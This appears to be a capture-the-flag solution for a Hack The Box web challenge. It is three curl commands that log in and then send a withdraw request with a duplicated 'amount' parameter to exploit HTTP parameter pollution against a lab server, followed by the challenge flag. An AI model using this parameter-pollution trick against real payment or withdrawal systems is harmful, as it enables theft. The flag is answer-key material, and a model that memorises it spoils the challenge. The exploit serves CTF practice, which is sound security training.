'''
#first, register a user, e.g. admin/admin

curl -c cookies.txt -X POST -d "username=admin&password=admin" http://94.237.49.138:32109/api/login
curl -b cookies.txt -X POST -d "account=0x34005ee473ed9514de006b9de120b83e&amount=0&amount=1337" http://94.237.49.138:32109/api/withdraw
curl -b cookies.txt http://94.237.49.138:32109/home

#HTB{p4r4m3t3r_p0llut10n_4r3_1mp0rt4nt_p4tch_1t_B0NK!}
'''
